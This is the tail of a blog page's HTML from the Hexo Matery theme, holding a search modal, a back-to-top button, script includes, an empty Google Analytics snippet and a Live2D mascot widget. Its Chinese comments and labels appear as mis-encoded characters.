    }/*å› ä¸ºå»ºç«™æ—¶é—´è¿˜æ²¡æœ‰ä¸€å¹´ï¼Œå°±å°†ä¹‹æ³¨é‡Šæ‰äº†ã€‚éœ€è¦çš„å¯ä»¥å–æ¶ˆ*/
    siteTime();
</script>

<!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
});
</script>
<!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', '');
</script>



    <script src="/libs/others/clicklove.js"></script>



<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":"true show:true","react":{"opacity":0.7}});</script></body>
</html>